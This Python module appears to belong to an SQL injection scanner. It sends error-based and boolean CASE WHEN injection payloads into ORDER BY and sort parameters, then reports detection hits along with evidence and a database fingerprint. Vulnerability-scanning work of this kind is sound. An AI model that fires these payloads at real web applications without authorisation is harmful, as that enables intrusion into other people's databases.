#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""ORDER BY / SORT clause SQLi probes."""

from __future__ import annotations

from typing import Callable, Optional, Tuple

from ..constants import DETECTION_CONFIDENCE
from ..fingerprint import evidence_snippet, fingerprint_dbms, match_sqli_error
from ..oracle import HttpParameterOracle, ProbeResponse
from ..techniques import TechniqueHit, boolean_evidence

ORDER_BY_PARAM_HINTS = frozenset(
    {"order", "sort", "orderby", "sortby", "order_by", "sort_by", "sortcolumn", "sortdir"}
)


def _order_error_probes(original: str) -> Tuple[str, ...]:
    base = (original or "ASC").strip() or "ASC"
    return (
        f"{base}'",
        f"{base},(SELECT 1)",
        f"{base} DESC,(SELECT 1 FROM (SELECT 1)a)",
    )


def _order_boolean_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str]]:
    base = (original or "ASC").strip() or "ASC"
    return (
        (
            f"{base},(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
            "ORDER BY true branch",
        ),
        (
            f"{base},(SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
            "ORDER BY false branch",
        ),
    )


def probe_order_by_sqli(
    send_payload: Callable[..., Tuple[object, float]],
    original: str,
    *,
    baseline: Optional[ProbeResponse] = None,
) -> Optional[TechniqueHit]:
    """
    Minimal ORDER BY injection probes (error then boolean).

    ``send_payload(payload)`` → ``(response, elapsed)``.
    """
    base = (original or "ASC").strip() or "ASC"
    oracle = HttpParameterOracle(original_value=base, send_payload=send_payload)
    if baseline is None:
        baseline = oracle.baseline()

    for payload in _order_error_probes(base):
        resp = oracle.send(payload)
        token = match_sqli_error(resp.text)
        if token:
            return TechniqueHit(
                technique="error",
                payload=payload,
                label="ORDER BY error",
                confidence=DETECTION_CONFIDENCE["error"],
                evidence=evidence_snippet(resp.text, token),
                dbms=fingerprint_dbms(resp.text),
                indicators=[f"ORDER BY SQL error: {token}"],
                status_code=resp.status_code,
                response_time=resp.elapsed,
                response_length=resp.length,
            )

    (true_payload, true_label), (false_payload, false_label) = _order_boolean_probes(base)
    true_resp = oracle.send(true_payload)
    false_resp = oracle.send(false_payload)
    evidence = boolean_evidence(baseline, true_resp, false_resp)
    if evidence:
        return TechniqueHit(
            technique="boolean",
            payload=false_payload,
            label=false_label,
            confidence=DETECTION_CONFIDENCE["boolean"],
            evidence=evidence,
            indicators=[f"ORDER BY boolean: {true_label} vs {false_label}"],
            status_code=false_resp.status_code,
            response_time=false_resp.elapsed,
            response_length=false_resp.length,
        )
    return None
